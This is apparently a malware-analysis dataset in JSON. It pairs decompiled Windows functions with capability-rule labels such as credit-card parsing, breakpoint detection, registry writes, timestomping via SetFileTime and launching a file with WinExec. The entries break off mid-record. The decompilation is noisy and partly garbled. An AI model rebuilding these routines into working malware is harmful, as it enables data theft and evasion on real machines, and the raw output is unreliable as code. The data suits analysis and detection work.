{
    "00401190": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401370) overlaps instruction at (ram,0x0040136f)\n// \n// WARNING: Removing unreachable block (ram,0x0040136d)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00401190(uint param_1, int32_t *param_2, uint16_t *param_3)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    uint32_t *in_EAX;\n    int32_t *piVar5;\n    int32_t iVar6;\n    uint16_t *puVar7;\n    uint32_t uVar8;\n    int32_t *unaff_EBX;\n    uchar *puVar9;\n    int32_t unaff_ESI;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint *puVar12;\n    uint *puVar13;\n    bool bVar14;\n    bool bVar15;\n    float10 in_ST0;\n    uchar auStack24 [4];\n    \n    puVar9 = &stack0xfffffffc;\n    while( true ) {\n        if (*param_3 != 0x5a4d) {\n            return 0;\n        }\n        if ((*param_3 < 0x5a4d) || (*param_3 >= 0x5a4d)) break;\n        in_ST0 = in_ST0 / *(unaff_ESI + 0x6f);\n        puVar1 = *in_EAX;\n        in_EAX = in_EAX + 1;\n        if (auStack24 < puVar1 || in_EAX == NULL) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    piVar5 = *(param_3 + 0x1e) + param_3;\n    if (*piVar5 != 0x4550) {\n        return 0;\n    }\n    if ((*piVar5 < 0x4550) || (0x454f < *piVar5)) {\n        puVar7 = piVar5[0x16];\n    }\n    else {\n        *(piVar5 + -0x1f3a4905) = in_ST0;\n        *param_2 = *param_2 + 0x488bdf84;\n        piVar5 = unaff_EBX;\n        puVar7 = param_3;\n    }\n    if (puVar7 != NULL) {\n        return 0;\n    }\n    bVar14 = (POPCOUNT(piVar5 & 0xcb) & 1U) == 0;\n    if ((bVar14) || (!bVar14)) {\n        bVar14 = *(param_3 + 0x1e) < 0x80;\n        bVar15 = *(param_3 + 0x1e) == 0x80;\n    }\n    else {\n        param_3 = param_2 + 1;\n        puVar9 = *0x8b17b43a + 1;\n        uVar4 = param_3;\n        *0x803c78 = *0x803c78 | uVar4;\n        bVar14 = CARRY1(*param_3, uVar4);\n        *param_3 = *param_3 + uVar4;\n        bVar15 = *param_3 == 0;\n    }\n    if (bVar14 || bVar15) {\n        return 0;\n    }\n    if (*(param_3 + 0x1e) < 0xc0) {\n        *(puVar9 + -4) = *(param_3 + 0x1e) - 0x80;\n    }\n    iVar6 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(*(puVar9 + -4));\n    pcVar3 = _sym.imp.MSVCRT.dll_rand;\n    *(puVar9 + -8) = iVar6;\n    if (iVar6 == 0) {\n        return 0;\n    }\n    uVar8 = *(puVar9 + -4);\n    uVar10 = 0;\n    bVar14 = false;\n    if (uVar8 != 0) {\n        do {\n            if ((!bVar14) && (bVar14)) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            iVar6 = (*pcVar3)();\n            uVar11 = uVar10 + 1;\n            bVar14 = SBORROW4(uVar11, uVar8);\n            *(uVar10 + *(puVar9 + -8)) = iVar6 % 0xff;\n            uVar10 = uVar11;\n        } while (uVar11 < uVar8);\n    }\n    puVar2 = *(puVar9 + -8);\n    puVar12 = puVar2;\n    puVar13 = *(puVar9 + 8) + 0x80;\n    for (uVar10 = uVar8 >> 2; uVar10 != 0; uVar10 = uVar10 - 1) {\n        *puVar13 = *puVar12;\n        puVar12 = puVar12 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    for (uVar8 = uVar8 & 3; uVar8 != 0; uVar8 = uVar8 - 1) {\n        *puVar13 = *puVar12;\n        puVar12 = puVar12 + 1;\n        puVar13 = puVar13 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar2);\n    return 1;\n}\n",
        "token_count": 1274
    },
    "004049f0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ad9) overlaps instruction at (ram,0x00404ad0)\n// \n// WARNING: Removing unreachable block (ram,0x00404aca)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint fcn.004049f0(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char cStack564;\n    uint uStack563;\n    uchar uStack304;\n    uint uStack303;\n    uchar auStack44 [4];\n    uchar auStack40 [8];\n    uchar auStack32 [8];\n    uchar auStack24 [16];\n    int32_t iStack8;\n    \n    cStack564 = '\\0';\n    uStack304 = '\\0';\n    puVar5 = &uStack563;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    puVar5 = &uStack304 + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    iStack8 = param_2;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &cStack564;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &uStack304;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x424198;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &uStack304;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&uStack304, 0, auStack44);\n    if ((param_2 == -1) && (iStack8 = fcn.00401700(param_1),  iStack8 == -1)) {\n        return 0;\n    }\n    iVar2 = iStack8;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iStack8, auStack40, auStack32, auStack24);\n    if (param_2 == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1194
    },
    "00404b50": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404bff) overlaps instruction at (ram,0x00404bfd)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00404b50(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint unaff_EDI;\n    ushort uStack32;\n    ushort uStack30;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uStack32 = unaff_EDI;\n    uStack30 = unaff_EDI >> 0x10;\n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        do {\n            uVar1 = *(var_ch % arg_ch + arg_8h);\n            uVar4 = var_ch % arg_ch + 0x15;\n            uVar3 = var_ch / arg_ch >> 8;\n            if ((uVar3 < uVar4) && (uVar4 <= uVar3)) {\n                var_ch = CONCAT22(uStack30, uStack32);\n            }\n            iVar2 = ((var_ch + -1) / arg_ch & 0xffffff00U | *(var_8h + arg_10h) ^ *((var_ch + -1) % arg_ch + arg_8h)) +\n                    0x5266532f;\n            *(arg_18h + -1 + var_ch) = var_10h ^ iVar2;\n            uStack32 = iVar2;\n            uStack30 = iVar2 >> 0x10;\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_8h = var_8h + 1;\n            var_ch = var_ch + 2;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 526
    },
    "004047e0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.004047e0(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4245ec == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004034d0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x424434, acStack1304, &uStack2112);\n    uStack2088 = 0x4244bc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4244d4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401000(auStack1564, 0x424430, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1867
    },
    "004014e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401509)\n// WARNING: Removing unreachable block (ram,0x00401511)\n// WARNING: Removing unreachable block (ram,0x00401514)\n// WARNING: Removing unreachable block (ram,0x00401495)\n// WARNING: Removing unreachable block (ram,0x004014a0)\n// WARNING: Removing unreachable block (ram,0x004014af)\n// WARNING: Removing unreachable block (ram,0x004014b8)\n// WARNING: Removing unreachable block (ram,0x004014c8)\n\nbool __cdecl fcn.004014e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00403160();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00401740();\n        arg_ch_01 = fcn.00401740();\n        arg_ch_02 = fcn.00401740();\n        fcn.004034d0(arg_10h, arg_ch_00);\n        fcn.004034d0(arg_8h, arg_ch_01);\n        fcn.004034d0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x424174, &lpBuffer, arg_10h);\n        iVar2 = fcn.00401e30(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x424180, &lpBuffer, arg_8h);\n            iVar2 = fcn.00401e30(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x424180, &lpBuffer, arg_ch);\n                iVar2 = fcn.00401e30(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.004034d0(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 736
    },
    "00401a90": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00401a90(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    uint unaff_retaddr;\n    uint32_t in_stack_fffffff8;\n    uint in_stack_fffffffc;\n    \n    iVar1 = fcn.00403540(0x80000002, 0x424328, 0x424374, &stack0xfffffffc, &stack0xfffffff8, &stack0xfffffff4, 4, \n                         in_stack_fffffff8, in_stack_fffffffc, unaff_retaddr, param_1, param_2, param_3);\n    if ((iVar1 == 0) || (5 < in_stack_fffffff8)) {\n        in_stack_fffffff8 = 0xffffffff;\n    }\n    return in_stack_fffffff8;\n}\n",
        "token_count": 185
    },
    "00402040": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool fcn.00402040(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00404f10(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x424328, 0x424368, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 260
    },
    "004030e0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040313c) overlaps instruction at (ram,0x0040313a)\n// \n\nuint fcn.004030e0(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint *puVar4;\n    bool bVar5;\n    uint *apuStack164 [3];\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    uint uStack8;\n    \n    puVar3 = &stack0xfffffffc;\n    bVar5 = (POPCOUNT(&fcn.004030e0::lpVersionInformation & 0xff) & 1U) == 0;\n    apuStack164[2] = &fcn.004030e0::lpVersionInformation;\n    lpVersionInformation = 0x94;\n    apuStack164[1] = 0x403100;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)();\n    if ((!bVar5) && (bVar5)) {\n        puVar4 = &stack0xffffff60;\n        cVar1 = '\\x1e';\n        do {\n            puVar3 = puVar3 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar2 = in(0x78);\n        return uVar2;\n    }\n    bVar5 = -1 < var_90h + -5;\n    if (var_90h == 5) {\n        return 1;\n    }\n    if ((bVar5) && (!bVar5)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 450
    },
    "004036b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403715) overlaps instruction at (ram,0x00403714)\n// \n\nuint __cdecl fcn.004036b0(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t unaff_ESI;\n    uint *puVar6;\n    code *pcVar7;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar7 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar6 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_160h = '\\0';\n    puVar6 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    puVar5 = arg_ch != 0;\n    if ((arg_ch < 0) || (arg_ch >= 0)) {\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4241dc, arg_8h);\n    }\n    else {\n        arg_8h = arg_ch + -0x1bf31dd6;\n        *puVar5 = *puVar5 & 0xc3;\n        pcVar2 = unaff_ESI & 0xffffff00 | unaff_ESI + 0x61;\n        *(arg_ch + -0x1bf31e49) = *(arg_ch + -0x1bf31e49) + '\\x01';\n        *pcVar2 = *pcVar2 + '\\x01';\n        pcVar7 = puVar6 + 3;\n    }\n    (*pcVar7)(&var_264h, 0x4241f4, arg_8h);\n    pcVar7 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar2 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar2 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    var_34h = 0x42421c;\n    var_30h = 0x424228;\n    var_2ch = 0x424234;\n    var_28h = 0x424244;\n    var_24h = 0x42424c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar4 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if (puVar5 < 0x5) {\n        uVar4 = puVar5 * 4;\n        do {\n            iVar3 = (*pcVar7)(0x80000002, &var_264h, *(&var_34h + uVar4), *(&var_5ch + uVar4), *(&var_20h + uVar4), \n                              *(&var_48h + uVar4));\n            if (iVar3 != 0) {\n                return 0;\n            }\n            uVar4 = uVar4 + 4;\n        } while (uVar4 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1286
    },
    "00401ae0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00401c3c) overlaps instruction at (ram,0x00401c3a)\n// \n// WARNING: Variable defined which should be unmapped: var_10bh\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl\nfcn.00401ae0(uint arg_8h, uint arg_ch, uint arg_10h, char *arg_14h, uint arg_18h, uint arg_1ch, int32_t arg_20h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    char *extraout_ECX;\n    char *pcVar4;\n    uint8_t extraout_DL;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *puVar5;\n    uchar uVar6;\n    bool bVar7;\n    uint in_stack_fffffeac;\n    char *in_stack_fffffeb0;\n    uint in_stack_fffffeb4;\n    char *arg_18h_00;\n    uchar var_10ch;\n    uint var_10bh;\n    uint in_stack_fffffef8;\n    uint in_stack_fffffefc;\n    uint in_stack_ffffff00;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00404b50(arg_18h, arg_1ch, arg_8h, 0x20, arg_20h + 0x20);\n    uVar6 = (POPCOUNT(((uVar1 & arg_20h >> 8) - 0x3488 & 0x7ee5) * 2 & 0xff) & 1U) == 0;\n    fcn.00404b50(arg_18h, arg_1ch, arg_ch, 0x20, arg_20h + 0x60);\n    pcVar2 = fcn.00404b50(arg_18h, arg_1ch, arg_10h, 0x20, arg_20h + 0xa0);\n    if ((uVar6) || (pcVar4 = extraout_ECX,  arg_18h_00 = extraout_ECX,  !uVar6)) {\n        pcVar2 = arg_20h + 0xe0;\n        in_stack_fffffeb4 = 0x20;\n        pcVar4 = arg_14h;\n        in_stack_fffffeac = arg_1ch;\n        in_stack_fffffeb0 = arg_14h;\n        arg_18h_00 = pcVar2;\n    }\n    *(arg_20h + -0x7c72ebb3) = *(arg_20h + -0x7c72ebb3) | 0xffffffe0;\n    *pcVar2 = *pcVar2 + pcVar2;\n    pcVar2[0x6a] = pcVar2[0x6a] + extraout_DL;\n    pcVar4[0x56] = pcVar4[0x56] & extraout_DL;\n    fcn.00404b50(arg_18h, in_stack_fffffeac, in_stack_fffffeb0, in_stack_fffffeb4, arg_18h_00);\n    iVar3 = fcn.00401a90();\n    if (iVar3 == -1) {\n        iVar3 = (*_sym.imp.MSVCRT.dll_rand)();\n        *(arg_20h + 0x120) = iVar3 % 5;\n    }\n    else {\n        *(arg_20h + 0x120) = iVar3;\n    }\n    // WARNING: Ignoring partial resolution of indirect\n    var_10ch = 0;\n    puVar5 = &var_10bh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    var_4h = 0x104;\n    *(puVar5 + 2) = 0;\n    iVar3 = fcn.00403540(0x80000001, 0x4243a8, 0x4243d4, &var_8h, &var_10ch, &var_4h, unaff_ESI, unaff_EBX, _var_10ch, \n                         stack0xfffffef4, in_stack_fffffef8, in_stack_fffffefc, in_stack_ffffff00);\n    if (iVar3 != 0) {\n        if ((-1 < iVar3) && (-1 >= iVar3)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)();\n        bVar7 = iVar3 == 0;\n        if (bVar7) {\n            if ((!bVar7) && (bVar7)) {\n                iVar3 = unaff_ESI;\n            }\n            *(arg_20h + 0x120) = *(arg_20h + 0x120) | 0x80;\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1172
    },
    "00401d50": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
